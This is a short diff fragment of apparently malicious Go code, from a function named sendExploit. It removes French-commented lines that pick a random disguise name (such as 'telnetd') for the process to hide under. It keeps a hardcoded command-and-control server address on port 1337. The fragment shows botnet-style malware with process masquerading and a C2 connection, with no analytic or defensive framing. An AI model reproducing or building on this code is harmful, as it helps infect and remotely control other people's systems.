@@ -126,9 +126,6 @@ func sendExploit(target string) int {
 		"telnetd",
 	}
 
-	// Sélectionner un nom aléatoire pour se cacher
-	hideName := hideNames[rand.Intn(len(hideNames))]
-
 	// Serveur C2
 	c2Server := "51.68.128.169:1337"
 	
